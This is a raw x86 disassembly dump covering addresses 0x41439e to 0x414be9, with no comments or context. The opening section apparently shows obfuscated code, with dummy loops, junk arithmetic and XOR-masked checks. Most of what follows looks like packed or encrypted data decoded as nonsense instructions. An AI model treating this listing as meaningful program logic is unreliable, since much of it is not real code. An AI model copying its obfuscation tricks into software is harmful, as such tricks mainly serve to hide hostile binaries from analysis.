  41439e:	cmp    DWORD PTR ds:0x428653,0x0
  4143a5:	je     0x4143df
  4143ab:	cmp    DWORD PTR ds:0x428653,0x25
  4143b2:	ja     0x4143df
  4143b8:	jmp    0x4143cd
  4143bd:	push   0x428034
  4143c2:	push   0x0
  4143c4:	push   DWORD PTR [ebp-0xc]
  4143c7:	call   DWORD PTR ds:0x4287ab
  4143cd:	mov    ebx,DWORD PTR ds:0x428653
  4143d3:	dec    ebx
  4143d4:	mov    DWORD PTR ds:0x428653,ebx
  4143da:	jmp    0x41439e
  4143df:	mov    ebx,DWORD PTR [ebp-0x50]
  4143e2:	add    DWORD PTR ds:0x42862f,0x3490
  4143ec:	add    edx,ecx
  4143ee:	xor    edx,ebx
  4143f0:	sbb    DWORD PTR ds:0x4285f3,edi
  4143f6:	mov    DWORD PTR [ebp-0x50],edx
  4143f9:	mov    edx,DWORD PTR [ebp+0x8]
  4143fc:	mov    ebx,DWORD PTR [ebp-0x4c]
  4143ff:	add    edx,edi
  414401:	add    DWORD PTR ds:0x42866b,0x26d2
  41440b:	and    edx,ebx
  41440d:	mov    DWORD PTR [ebp-0x4c],edx
  414410:	and    DWORD PTR ds:0x42862b,0x0
  41441a:	xor    edx,edx
  41441c:	xor    edx,DWORD PTR ds:0x42862b
  414422:	inc    edx
  414423:	mov    DWORD PTR ds:0x42862b,edx
  414429:	cmp    DWORD PTR ds:0x42862b,0x2c
  414430:	jbe    0x414453
  414436:	jmp    0x414446
  41443b:	push   0x42808e
  414440:	call   DWORD PTR ds:0x4287af
  414446:	cmp    DWORD PTR ds:0x42862b,0x1f
  41444d:	jb     0x41441a
  414453:	mov    edx,DWORD PTR [ebp+0x8]
  414456:	mov    ebx,DWORD PTR [ebp-0x48]
  414459:	lea    edx,[ebx+edx*1+0x241fcde]
  414460:	mov    DWORD PTR [ebp-0x48],edx
  414463:	mov    edx,DWORD PTR [ebp+0x8]
  414466:	mov    ebx,0xfa5e1521
  41446b:	sub    ebx,edx
  41446d:	add    ebx,DWORD PTR [ebp-0x44]
  414470:	mov    DWORD PTR [ebp-0x44],ebx
  414473:	mov    edx,DWORD PTR [ebp+0x8]
  414476:	xor    edx,eax
  414478:	add    edx,esi
  41447a:	jne    0x411f5b
  414480:	mov    edx,DWORD PTR [ebp-0xc]
  414483:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41448a:	mov    bl,BYTE PTR [ebp-0x1]
  41448d:	cmp    dl,bl
  41448f:	je     0x41b050
  414495:	mov    ecx,DWORD PTR [ebp-0x5c]
  414498:	mov    edx,DWORD PTR [ebp-0xc]
  41449b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4144a2:	mov    ebx,DWORD PTR [ebp+0xc]
  4144a5:	xor    ecx,eax
  4144a7:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272ec]
  4144ae:	jne    0x41b184
  4144b4:	mov    ecx,DWORD PTR [ebp-0x5c]
  4144b7:	mov    edx,DWORD PTR [ebp+0xc]
  4144ba:	xor    ecx,eax
  4144bc:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272ec]
  4144c4:	mov    edx,DWORD PTR [ebp-0x18]
  4144c7:	xor    edx,eax
  4144c9:	add    edx,esi
  4144cb:	cmp    ecx,edx
  4144cd:	mov    ecx,DWORD PTR [ebp-0x14]
  4144d0:	mov    DWORD PTR [ebp+0x8],ecx
  4144d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4144d6:	je     0x41d62d
  4144dc:	xor    ecx,eax
  4144de:	add    ecx,esi
  4144e0:	mov    ecx,0x242ebcc
  4144e5:	je     0x41b0d8
  4144eb:	mov    edx,DWORD PTR [ebp+0x8]
  4144ee:	mov    ebx,DWORD PTR [ebp-0x8]
  4144f1:	xor    edx,eax
  4144f3:	xor    ebx,eax
  4144f5:	sub    edx,ebx
  4144f7:	sub    edx,esi
  4144f9:	xor    edx,eax
  4144fb:	mov    DWORD PTR [ebp+0x8],edx
  4144fe:	mov    edx,DWORD PTR [ebp+0x8]
  414501:	mov    ebx,DWORD PTR [ebp-0x58]
  414504:	add    edx,0x5708f1
  41450a:	imul   edx,ebx
  41450d:	jmp    0x4168ae
  414512:	dec    eax
  414513:	pop    DWORD PTR [eax+ebx*8-0x70f72485]
  41451a:	lea    ebx,[eax-0x3a]
  41451d:	push   edi
  41451e:	mov    bl,0xb1
  414520:	add    eax,0x7d663ac2
  414525:	jp     0x414525
  414527:	pop    edi
  414528:	jp     0x4145a4
  41452a:	icebp  
  41452b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41452c:	mov    bl,0x3e
  41452e:	jno    0x414525
  414530:	push   esi
  414531:	jno    0x414553
  414533:	dec    eax
  414534:	mov    edi,0xbcc4efdc
  414539:	pop    edi
  41453a:	jmp    0x4144f6
  41453c:	mov    cl,0xff
  41453e:	push   0xffffff8c
  414540:	retf   0x7106
  414543:	call   DWORD PTR [eax+eiz*4+0x8]
  414547:	add    eax,0x58c65157
  41454c:	mov    al,ds:0x1caa6c9f
  414551:	jp     0x4144fa
  414553:	dec    ecx
  414554:	inc    edx
  414555:	dec    esp
  414556:	sbb    eax,0xc3130747
  41455b:	jle    0x41455a
  41455d:	push   ds
  41455e:	pop    esi
  41455f:	lea    ebx,[ecx+ebx*2-0x6e]
  414563:	retf   
  414564:	cmp    esp,DWORD PTR ds:0x221e4187
  41456a:	into   
  41456b:	xchg   esp,eax
  41456c:	and    dh,bl
  41456e:	inc    ebx
  41456f:	fwait
  414570:	xchg   bh,ch
  414572:	jae    0x41458b
  414574:	mov    DWORD PTR [ecx-0x3f804863],ebp
  41457a:	jp     0x41452c
  41457c:	aas    
  41457d:	out    dx,al
  41457e:	push   cs
  41457f:	sub    DWORD PTR [edi],esi
  414581:	jo     0x414556
  414583:	mov    ch,0x62
  414585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414586:	jne    0x41458e
  414588:	(bad)  
  414589:	dec    ebp
  41458a:	jecxz  0x4145a2
  41458c:	mov    ebp,0x6c9e8fad
  414591:	and    al,BYTE PTR [esi]
  414593:	ret    0xa766
  414596:	and    edi,DWORD PTR [ebp+0x68]
  414599:	fild   WORD PTR [edi+0x71]
  41459c:	push   esp
  41459d:	xrelease xchg DWORD PTR [edi+esi*4+0x1e],edx
  4145a2:	xchg   edi,eax
  4145a3:	or     ch,BYTE PTR [ecx]
  4145a5:	stc    
  4145a6:	enter  0xd500,0xb4
  4145aa:	cmp    eax,DWORD PTR [esi-0x4]
  4145ad:	mov    edi,DWORD PTR [ebp+0x54a6d378]
  4145b3:	mov    ds:0x6a3acda7,eax
  4145b8:	push   0x5b852412
  4145bd:	out    dx,al
  4145be:	mov    edi,0x7d187480
  4145c3:	cwde   
  4145c4:	sub    eax,0x79f73bd0
  4145c9:	dec    cx
  4145cb:	pop    esp
  4145cc:	sbb    al,0x55
  4145ce:	jae    0x414585
  4145d0:	pop    ecx
  4145d1:	or     al,0xee
  4145d3:	repz cs cwde 
  4145d6:	lods   al,BYTE PTR ds:[esi]
  4145d7:	mov    dl,0x1f
  4145d9:	adc    DWORD PTR [edx+esi*4-0x34],0xff84ba74
  4145e1:	call   0x1f8f19a6
  4145e6:	mov    edi,0x2b165b0e
  4145eb:	mov    ebp,esi
  4145ed:	cmp    al,0x17
  4145ef:	add    al,0x19
  4145f1:	pop    ecx
  4145f2:	pop    ds
  4145f3:	and    BYTE PTR [ebx-0x17283a4b],ch
  4145f9:	sub    BYTE PTR [eax+ebx*2],ah
  4145fc:	mov    DWORD PTR [ebx+0x59209380],esi
  414602:	stos   BYTE PTR es:[edi],al
  414603:	fild   DWORD PTR [ebx*4+0x617dbb8b]
  41460a:	add    al,BYTE PTR [edi]
  41460c:	push   edx
  41460d:	lahf   
  41460e:	mov    bh,0x6c
  414610:	jmp    0xd556c559
  414615:	mov    ecx,0x3c83aeae
  41461a:	js     0x414626
  41461c:	mov    ch,0x4f
  41461e:	dec    edi
  41461f:	ins    BYTE PTR es:[edi],dx
  414620:	mov    edx,0x6968d680
  414625:	pop    ss
  414626:	aas    
  414627:	mov    ah,0x44
  414629:	test   BYTE PTR [edx+edi*2+0x2cd621da],ch
  414630:	sub    al,BYTE PTR [ebx]
  414632:	lods   al,BYTE PTR ds:[esi]
  414633:	push   ds
  414634:	rol    ecx,cl
  414636:	sub    edx,ecx
  414638:	ffreep st(0)
  41463a:	fstp   st(6)
  41463c:	fild   QWORD PTR ds:[ecx+ecx*4-0x59]
  414641:	inc    edx
  414642:	jecxz  0x414655
  414644:	cmp    al,0xa4
  414646:	mov    al,BYTE PTR [eax+0x21958521]
  41464c:	(bad)  
  41464d:	pop    eax
  41464e:	push   edx
  41464f:	adc    al,0xe0
  414651:	and    eax,0x94f860f5
  414656:	je     0x414620
  414658:	adc    BYTE PTR ds:0xbbc3b0da,dl
  41465e:	mov    esp,0xdb1faf06
  414663:	inc    edx
  414664:	aad    0x2f
  414666:	dec    edx
  414667:	xchg   ecx,eax
  414668:	cmp    eax,DWORD PTR [edi+0x375bffe0]
  41466e:	(bad)  
  414670:	in     eax,0x22
  414672:	ret    0xbcf
  414675:	stos   BYTE PTR es:[edi],al
  414676:	xchg   ebp,eax
  414677:	inc    esp
  414678:	das    
  414679:	in     eax,0xf0
  41467b:	lahf   
  41467c:	adc    DWORD PTR [ecx],ebx
  41467e:	and    al,0xad
  414680:	sbb    edx,DWORD PTR [ebp-0x15]
  414683:	push   edi
  414684:	scas   eax,DWORD PTR es:[edi]
  414685:	cmp    BYTE PTR ds:0xf48423f,dh
  41468b:	(bad)  
  41468c:	jl     0x4146f2
  41468e:	outs   dx,DWORD PTR ds:[esi]
  41468f:	or     al,0xd7
  414691:	adc    eax,0xabb94afb
  414696:	push   ebx
  414697:	fidivr DWORD PTR [ecx+0x79ac85e]
  41469d:	cmp    eax,0xdd123bc7
  4146a2:	aaa    
  4146a3:	and    esi,DWORD PTR [edx-0xd]
  4146a6:	lahf   
  4146a7:	arpl   WORD PTR [edx-0x4b07a863],bx
  4146ad:	(bad)  [ebx+0x3d5d7747]
  4146b3:	in     al,dx
  4146b4:	inc    ecx
  4146b5:	sahf   
  4146b6:	lea    edi,[ebx]
  4146b8:	and    edi,ecx
  4146ba:	ret    
  4146bb:	test   BYTE PTR [ecx],dl
  4146bd:	push   ebp
  4146be:	dec    ebx
  4146bf:	add    BYTE PTR [ecx],ah
  4146c1:	test   eax,0xc45f4725
  4146c6:	sbb    al,0xe6
  4146c8:	mov    ah,dl
  4146ca:	pushf  
  4146cb:	es cdq 
  4146cd:	cs push 0xffffffad
  4146d0:	xor    dh,0xa
  4146d3:	lahf   
  4146d4:	sub    cl,ch
  4146d6:	mov    ah,0x9d
  4146d8:	xchg   ebp,eax
  4146d9:	pop    edx
  4146da:	cli    
  4146db:	out    0x4f,eax
  4146dd:	lahf   
  4146de:	mov    ds:0x6ab78577,al
  4146e3:	fs cmp eax,0x20e113b7
  4146e9:	adc    BYTE PTR [edx+0x78],0x21
  4146ed:	(bad)  
  4146ee:	jnp    0x41476e
  4146f0:	dec    eax
  4146f1:	xchg   edx,eax
  4146f2:	mov    dl,cl
  4146f4:	sub    ah,dl
  4146f6:	aad    0x6
  4146f8:	mov    edx,0x475c4b83
  4146fd:	ficom  WORD PTR [edx]
  4146ff:	jae    0x41469f
  414701:	and    al,0xbe
  414703:	xchg   edx,eax
  414704:	nop
  414705:	lock push eax
  414707:	mov    al,0x8d
  414709:	mov    al,cl
  41470b:	stc    
  41470c:	push   es
  41470d:	lea    ecx,[ebx-0x34]
  414710:	inc    eax
  414711:	push   cs
  414712:	sbb    DWORD PTR [ebx+0x97e5359],ebx
  414718:	es adc al,0x88
  41471b:	push   es
  41471c:	test   BYTE PTR [ecx+0x39],dh
  41471f:	lds    ecx,FWORD PTR [ecx-0x66]
  414722:	inc    edx
  414723:	xchg   ebp,eax
  414724:	dec    ebp
  414725:	fisub  WORD PTR [ecx-0x5b9593b8]
  41472b:	les    edi,FWORD PTR [esi]
  41472d:	js     0x4146e0
  41472f:	or     DWORD PTR [edx-0x39018bb3],ebx
  414735:	mov    edx,0x4806887c
  41473a:	push   es
  41473b:	enter  0x3ebe,0x22
  41473f:	or     ebp,DWORD PTR [esi-0x68c0b025]
  414745:	jmp    0x4147bb
  414747:	xor    al,0x65
  414749:	pop    ss
  41474a:	retf   0x71e1
  41474d:	in     eax,0xda
  41474f:	xor    BYTE PTR ds:0x3b464be0,al
  414755:	lahf   
  414756:	pop    eax
  414757:	push   0x7d
  414759:	sbb    DWORD PTR [eax-0x56793a97],0x4c
  414760:	sub    ecx,esp
  414762:	je     0x414781
  414764:	cwde   
  414765:	cli    
  414766:	lahf   
  414767:	push   edx
  414768:	sub    BYTE PTR [esi+ecx*8-0x7df34d62],ah
  41476f:	rcl    DWORD PTR [ecx-0x72],1
  414772:	mov    ebp,0x2a6a9b9d
  414777:	(bad)  
  414778:	std    
  414779:	imul   esi,DWORD PTR [ebx-0x5f0f7eab],0x4d
  414780:	mov    ch,BYTE PTR [eax-0x291beb50]
  414786:	sbb    eax,0x247f9
  41478b:	aam    0x4d
  41478d:	sub    DWORD PTR [ecx],esi
  41478f:	es push ebp
  414791:	in     eax,dx
  414792:	mov    bh,0xd2
  414794:	aam    0x41
  414796:	pop    ss
  414797:	sub    ah,dh
  414799:	push   edx
  41479a:	ret    
  41479b:	shr    DWORD PTR [edi+0x196d839d],1
  4147a1:	lds    esp,FWORD PTR [ebp+0x4a40d835]
  4147a7:	push   ds
  4147a8:	iret   
  4147a9:	or     eax,DWORD PTR [esi+0x71]
  4147ac:	and    al,0x50
  4147ae:	les    edx,FWORD PTR [edi]
  4147b0:	mov    ebp,0x7696e451
  4147b5:	shl    BYTE PTR [ebp+0x7a319bb5],1
  4147bb:	mov    ebp,0x2daffd2f
  4147c0:	jbe    0x414791
  4147c2:	ror    BYTE PTR [ecx],0xed
  4147c5:	shl    DWORD PTR [esi-0x30a131a9],0x4c
  4147cc:	jecxz  0x414847
  4147ce:	xor    DWORD PTR [ecx],esp
  4147d0:	pop    ds
  4147d1:	cld    
  4147d2:	push   ecx
  4147d3:	jne    0x414825
  4147d5:	dec    esp
  4147d6:	push   esi
  4147d7:	inc    edx
  4147d8:	fs xchg esi,eax
  4147da:	mov    ebx,0x1c1c1356
  4147df:	jno    0x414800
  4147e1:	shr    BYTE PTR [edx],1
  4147e3:	shl    DWORD PTR [eax-0xb35a65c],cl
  4147e9:	hlt    
  4147ea:	cmp    BYTE PTR [esi-0x2f],bl
  4147ed:	call   0x2833:0x3a4b4663
  4147f4:	adc    eax,0xc7f05a48
  4147f9:	scas   eax,DWORD PTR es:[edi]
  4147fa:	imul   ebx,DWORD PTR [ebp-0x6d],0xffffffd4
  4147fe:	call   0xf6385375
  414803:	mov    bh,0x93
  414805:	or     bh,BYTE PTR [ebx-0x177a9a98]
  41480b:	dec    edi
  41480c:	fwait
  41480d:	(bad)  
  41480e:	and    esi,DWORD PTR [edx+0x33]
  414811:	and    BYTE PTR [edx],cl
  414813:	lahf   
  414814:	add    esi,DWORD PTR es:[ebx-0x22]
  414818:	outs   dx,BYTE PTR ds:[esi]
  414819:	das    
  41481a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41481b:	xchg   ebp,eax
  41481c:	or     ah,0xf9
  41481f:	xor    BYTE PTR [esi+0x55],cl
  414822:	pop    eax
  414823:	call   0x976f:0x62a4b5cf
  41482a:	mov    ebp,0x8fcf1e49
  41482f:	mov    bh,0x45
  414831:	mov    ebx,0x1b1e8b85
  414836:	loop   0x414819
  414838:	out    dx,eax
  414839:	and    DWORD PTR [esp+ecx*1+0x68],0x5b
  41483e:	inc    ebx
  41483f:	scas   al,BYTE PTR es:[edi]
  414840:	pop    ebp
  414841:	mov    bl,0x92
  414843:	fsub   DWORD PTR ds:0x63d577cf
  414849:	push   cs
  41484a:	jmp    0x41481a
  41484c:	aas    
  41484d:	(bad)  
  41484e:	pop    esp
  41484f:	xlat   BYTE PTR ds:[ebx]
  414850:	mov    edi,0x911df528
  414855:	jbe    0x4148af
  414857:	sub    eax,0x8c400585
  41485c:	xchg   edx,eax
  41485d:	dec    eax
  41485e:	dec    esi
  41485f:	cmp    edi,0xf9751150
  414865:	mov    eax,ds:0x17726417
  41486a:	adc    eax,DWORD PTR [ecx+eiz*2-0x1b]
  41486e:	scas   eax,DWORD PTR es:[edi]
  41486f:	push   ds
  414870:	add    eax,0xb9db90ba
  414875:	mov    ds,WORD PTR [ecx-0x54]
  414878:	xor    dh,al
  41487a:	fdivp  st(2),st
  41487c:	push   eax
  41487d:	icebp  
  41487e:	dec    ecx
  41487f:	xchg   ecx,eax
  414880:	adc    DWORD PTR [edi+0x13],ebx
  414883:	push   0xffffff9d
  414885:	push   ebp
  414886:	stos   BYTE PTR es:[edi],al
  414887:	and    BYTE PTR [esi+0x11],bh
  41488a:	nop
  41488b:	test   DWORD PTR [ecx-0x5d],eax
  41488e:	je     0x4148d4
  414890:	push   ebp
  414891:	fild   WORD PTR [edi-0x61c420ec]
  414897:	scas   eax,DWORD PTR es:[edi]
  414898:	mov    edi,0x5e09f3cd
  41489d:	push   ecx
  41489e:	popf   
  41489f:	test   BYTE PTR [ecx],ah
  4148a1:	adc    al,0x94
  4148a3:	cmp    BYTE PTR [eax-0x39fa5416],ch
  4148a9:	xor    ebx,ebp
  4148ab:	cli    
  4148ac:	int3   
  4148ad:	rcl    BYTE PTR [edi-0x4f02a8ed],cl
  4148b3:	addr16 sub al,0x9e
  4148b6:	ret    
  4148b7:	les    edi,FWORD PTR [edx]
  4148b9:	and    dl,bh
  4148bb:	ins    DWORD PTR es:[edi],dx
  4148bc:	sbb    edi,DWORD PTR [edi]
  4148be:	sub    ebp,DWORD PTR [ecx]
  4148c0:	add    esi,DWORD PTR [eax-0x5a]
  4148c3:	cmc    
  4148c4:	cmp    al,0x73
  4148c6:	or     DWORD PTR [ebp+esi*2+0x2d],edi
  4148ca:	fucom  st(1)
  4148cc:	ror    BYTE PTR [edi],0xa
  4148cf:	push   es
  4148d0:	mov    dh,0x81
  4148d2:	inc    eax
  4148d3:	(bad)  [esi]
  4148d5:	rcl    DWORD PTR [eax+edi*1-0x77],cl
  4148d9:	aaa    
  4148da:	icebp  
  4148db:	jb     0x414911
  4148dd:	sbb    al,0x15
  4148df:	shl    DWORD PTR ds:0x34b36bc5,cl
  4148e5:	call   0xf032:0x87621326
  4148ec:	jbe    0x41493f
  4148ee:	imul   esp,DWORD PTR [esi+0x43],0x40
  4148f2:	fnstsw WORD PTR ds:0x4686bf11
  4148f8:	or     al,0x4a
  4148fa:	jb     0x41489b
  4148fc:	xor    BYTE PTR [ebx-0x11],ah
  4148ff:	mov    ah,0x65
  414901:	(bad)  
  414903:	sub    DWORD PTR [ebx-0x3b398365],esi
  414909:	cdq    
  41490a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41490b:	aaa    
  41490c:	test   DWORD PTR [edi],eax
  41490e:	mov    edx,0x3d772c26
  414913:	(bad)  
  414914:	jmp    0x414899
  414916:	in     al,0x57
  414918:	xchg   esp,eax
  414919:	mov    eax,0xbf834437
  41491e:	mov    ds:0x8a254b59,al
  414923:	pop    es
  414924:	push   0x0
  414926:	cs test al,0x8d
  414929:	mov    bl,0x5d
  41492b:	and    eax,0x443e4844
  414930:	stc    
  414931:	shl    ch,0x38
  414934:	es stos DWORD PTR es:[edi],eax
  414936:	ins    BYTE PTR es:[edi],dx
  414937:	cmp    ebp,ecx
  414939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493a:	imul   DWORD PTR [ebx+0x6eff570c]
  414940:	dec    ebp
  414941:	jg     0x41491b
  414943:	sub    BYTE PTR [eax+0x3a8ca0be],bl
  414949:	mov    ch,ah
  41494b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41494c:	stos   DWORD PTR es:[edi],eax
  41494d:	ins    DWORD PTR es:[edi],dx
  41494e:	ss out 0xfb,eax
  414951:	rol    al,0x39
  414954:	xchg   edi,eax
  414955:	idiv   ch
  414957:	out    0xe2,al
  414959:	(bad)  
  41495a:	push   ecx
  41495b:	jmp    0xe326:0xbea502e1
  414962:	leave  
  414963:	xchg   edi,eax
  414964:	test   ecx,0x47376781
  41496a:	mov    esp,DWORD PTR [ebx-0x1ecce625]
  414970:	mov    cs,WORD PTR [edi+0x1d49b1aa]
  414976:	dec    eax
  414977:	adc    BYTE PTR [esi+0x235afc3b],0xf
  41497e:	hlt    
  41497f:	sub    al,al
  414981:	retf   0x7f18
  414984:	or     eax,0x8ea37a1b
  414989:	jecxz  0x414986
  41498b:	sub    eax,0x4d0a1127
  414990:	mov    ebp,ebx
  414992:	mov    dl,bl
  414994:	test   BYTE PTR [edi],al
  414996:	jnp    0x4149dc
  414998:	sub    al,0x8e
  41499a:	out    0xf0,eax
  41499c:	jno    0x414953
  41499e:	pop    eax
  41499f:	mov    ebx,0xb423c06d
  4149a4:	arpl   WORD PTR [eax+0x6bf3ffe4],bx
  4149aa:	(bad)  
  4149ac:	inc    edx
  4149ad:	scas   eax,DWORD PTR es:[edi]
  4149ae:	fidivr WORD PTR [edx+0x13]
  4149b1:	cmc    
  4149b2:	stos   DWORD PTR es:[edi],eax
  4149b3:	push   ebp
  4149b4:	lock das 
  4149b6:	inc    ebp
  4149b7:	clc    
  4149b8:	adc    al,0x45
  4149ba:	inc    edx
  4149bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149bc:	adc    eax,0xa572b3fa
  4149c1:	adc    esi,DWORD PTR [ebp+0x1e]
  4149c4:	xchg   edx,eax
  4149c5:	pop    ds
  4149c6:	jl     0x41496d
  4149c8:	inc    ecx
  4149c9:	ds mov edi,0x15bb2bbd
  4149cf:	stos   DWORD PTR es:[edi],eax
  4149d0:	mov    cl,0x2d
  4149d2:	inc    ebp
  4149d3:	mov    bh,0x81
  4149d5:	mov    edx,0x82058964
  4149da:	outs   dx,DWORD PTR ds:[esi]
  4149db:	xor    ch,dh
  4149dd:	int3   
  4149de:	fcomp  DWORD PTR [ecx]
  4149e0:	jl     0x4149b0
  4149e2:	jae    0x414973
  4149e4:	mov    dh,0x1
  4149e6:	outs   dx,BYTE PTR ds:[esi]
  4149e7:	sbb    eax,0x76d14bfc
  4149ec:	jo     0x4149b3
  4149ee:	aad    0x8d
  4149f0:	push   0xb7dd914f
  4149f5:	and    esi,DWORD PTR [esi+0x6d]
  4149f8:	cli    
  4149f9:	in     al,0x34
  4149fb:	jg     0x414a2d
  4149fd:	push   edx
  4149fe:	test   BYTE PTR [eax],cl
  414a00:	stc    
  414a01:	jmp    0x414f:0x695c237e
  414a08:	jb     0x414a2c
  414a0a:	mov    edi,0x53ed8d8e
  414a0f:	push   ecx
  414a10:	jae    0x414a45
  414a12:	popa   
  414a13:	jb     0x414a90
  414a15:	and    BYTE PTR [ebp-0x6af47153],dl
  414a1b:	test   eax,0xdf66c4d2
  414a20:	add    esp,DWORD PTR [ecx+0x194a3c0e]
  414a26:	mov    ch,0x41
  414a28:	test   DWORD PTR [esi],edx
  414a2a:	mov    ebp,0x475c5ed
  414a2f:	shr    DWORD PTR [edx],1
  414a31:	shl    DWORD PTR [edi],0x96
  414a34:	push   0x91d8ad80
  414a39:	jl     0x414a39
  414a3b:	loop   0x414a53
  414a3d:	icebp  
  414a3e:	mov    edi,0x57786e63
  414a43:	shr    DWORD PTR [ebp+esi*4+0x31],0xcb
  414a48:	in     eax,dx
  414a49:	and    al,0x6f
  414a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a4c:	cmp    DWORD PTR [eax+0x7b8f11cf],edi
  414a52:	call   0xee322f1a
  414a57:	sub    DWORD PTR [eax+0x54a87d3b],edi
  414a5d:	jg     0x414a15
  414a5f:	lods   eax,DWORD PTR ds:[esi]
  414a60:	push   cs
  414a61:	adc    al,0x61
  414a63:	sub    al,0xfd
  414a65:	(bad)  
  414a67:	mov    bl,0x62
  414a69:	mov    ecx,es
  414a6b:	(bad)
  414a6e:	retf   0x6bf3
  414a71:	inc    ecx
  414a72:	leave  
  414a73:	push   eax
  414a74:	iret   
  414a75:	repz in eax,0xa0
  414a78:	repnz dec eax
  414a7a:	scas   eax,DWORD PTR es:[edi]
  414a7b:	jae    0x414a7c
  414a7d:	inc    ebx
  414a7e:	arpl   WORD PTR [edx-0x6e2086c9],sp
  414a84:	aam    0xcf
  414a86:	inc    edx
  414a87:	mov    edi,0x15e4dcd4
  414a8c:	jle    0x414a25
  414a8e:	adc    cl,BYTE PTR [edx-0x5]
  414a91:	pushf  
  414a92:	and    eax,DWORD PTR [eax-0x6b]
  414a95:	arpl   WORD PTR [ecx+0x1351ff4f],bx
  414a9b:	retf   0xfa99
  414a9e:	(bad)  
  414a9f:	fst    DWORD PTR [ecx-0x35d0d92]
  414aa5:	and    al,0xa
  414aa7:	sbb    eax,0x6bd88500
  414aac:	xchg   BYTE PTR [ebx+ebp*2+0x8950773],ah
  414ab3:	test   ebx,esi
  414ab5:	push   edi
  414ab6:	pop    edi
  414ab7:	outs   dx,BYTE PTR ds:[esi]
  414ab8:	mov    ds:0x4da45a11,al
  414abd:	adc    eax,0xca298c07
  414ac2:	cdq    
  414ac3:	fsubr  st,st(5)
  414ac5:	add    ch,bl
  414ac7:	iret   
  414ac8:	mov    ch,bl
  414aca:	lods   eax,DWORD PTR ds:[esi]
  414acb:	cmc    
  414acc:	int    0x29
  414ace:	icebp  
  414acf:	fiadd  WORD PTR [edx]
  414ad1:	mov    edx,0xc6760ea0
  414ad6:	imul   esp,DWORD PTR [ecx+0x23],0x775219e4
  414add:	mov    BYTE PTR [ebx],dh
  414adf:	test   edx,esp
  414ae1:	out    dx,al
  414ae2:	loope  0x414b21
  414ae4:	jo     0x414b5a
  414ae6:	lahf   
  414ae7:	sub    eax,ebx
  414ae9:	mov    dh,bl
  414aeb:	jo     0x414aff
  414aed:	or     dh,BYTE PTR ds:0xe3080508
  414af3:	(bad)  
  414af4:	push   edx
  414af5:	ja     0x414b09
  414af7:	mov    ch,0x22
  414af9:	ins    DWORD PTR es:[edi],dx
  414afa:	mov    al,ds:0x39153e14
  414aff:	or     eax,0xb05b9d57
  414b04:	pop    esi
  414b05:	jmp    0xfee76176
  414b0a:	fstp   QWORD PTR [ecx-0x25a340f3]
  414b10:	lds    esp,FWORD PTR [eax-0x53]
  414b13:	iret   
  414b14:	cmp    esi,eax
  414b16:	mov    al,ds:0x53650067
  414b1b:	repnz adc dl,ah
  414b1e:	fwait
  414b1f:	sbb    bh,bl
  414b21:	sbb    cl,BYTE PTR [esi]
  414b23:	mov    ebx,0x4e8f39bd
  414b28:	je     0x414b8f
  414b2a:	mov    bh,0x85
  414b2c:	dec    ecx
  414b2d:	jg     0x414b41
  414b2f:	(bad)  
  414b31:	sbb    dl,BYTE PTR [esi+0x36]
  414b34:	or     eax,0x52b61c50
  414b39:	jmp    0x414b2c
  414b3b:	dec    ebp
  414b3c:	push   ebp
  414b3d:	dec    ebx
  414b3e:	ins    DWORD PTR es:[edi],dx
  414b3f:	push   0xffffffa8
  414b41:	test   al,0x2
  414b43:	out    dx,eax
  414b44:	loop   0x414b7d
  414b46:	cwde   
  414b47:	jbe    0x414b6b
  414b49:	mov    edi,0x15414479
  414b4e:	pop    ecx
  414b4f:	jmp    0x414b47
  414b51:	in     eax,dx
  414b52:	(bad)  
  414b53:	cmp    DWORD PTR [ecx],esi
  414b55:	jge    0x414ae3
  414b57:	out    dx,eax
  414b58:	adc    eax,0x78ac9a99
  414b5d:	popa   
  414b5e:	mov    edi,0x6f5c397d
  414b63:	in     al,0xb7
  414b65:	xchg   edx,eax
  414b66:	pop    edi
  414b67:	into   
  414b68:	mov    edx,0x73e5b377
  414b6d:	ja     0x414af7
  414b6f:	rcr    DWORD PTR [edx+0x23],cl
  414b72:	add    BYTE PTR [esi+0x33f50ffa],0x5e
  414b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b7a:	icebp  
  414b7b:	rcl    DWORD PTR [eax+ebp*2-0x2b],cl
  414b7f:	add    bl,BYTE PTR [edi-0x19efdad7]
  414b85:	xchg   ecx,eax
  414b86:	call   0x19f9767
  414b8b:	(bad)  
  414b8c:	fmul   QWORD PTR [esi-0x23]
  414b8f:	or     BYTE PTR [edx-0x14],cl
  414b92:	int    0x34
  414b94:	add    DWORD PTR [ebx+0x9576634],eax
  414b9a:	dec    esp
  414b9b:	aad    0xab
  414b9d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  414b9f:	cmp    ch,dh
  414ba1:	add    al,BYTE PTR [eax]
  414ba3:	dec    eax
  414ba4:	dec    dl
  414ba6:	xor    BYTE PTR [edx-0x8711cb8],dl
  414bac:	scas   eax,DWORD PTR es:[edi]
  414bad:	add    al,0x15
  414baf:	push   esp
  414bb0:	jne    0x414b72
  414bb2:	mov    eax,ds:0xcb177c63
  414bb7:	test   edx,esi
  414bb9:	std    
  414bba:	jb     0x414bbb
  414bbc:	rcr    BYTE PTR [ebx],1
  414bbe:	cmp    esi,DWORD PTR ds:0x21b0ae1
  414bc4:	test   al,0xac
  414bc6:	sar    DWORD PTR [edx],1
  414bc8:	scas   eax,DWORD PTR es:[edi]
  414bc9:	dec    edi
  414bca:	ss scas eax,DWORD PTR es:[edi]
  414bcc:	mov    ds:0x325c6687,eax
  414bd1:	ss add bh,ah
  414bd4:	popf   
  414bd5:	hlt    
  414bd6:	icebp  
  414bd7:	pop    es
  414bd8:	sbb    eax,0xa3bd6dc5
  414bdd:	jl     0x1f767119
  414be3:	std    
  414be4:	and    eax,0xae72bf92
  414be9:	fs push ecx
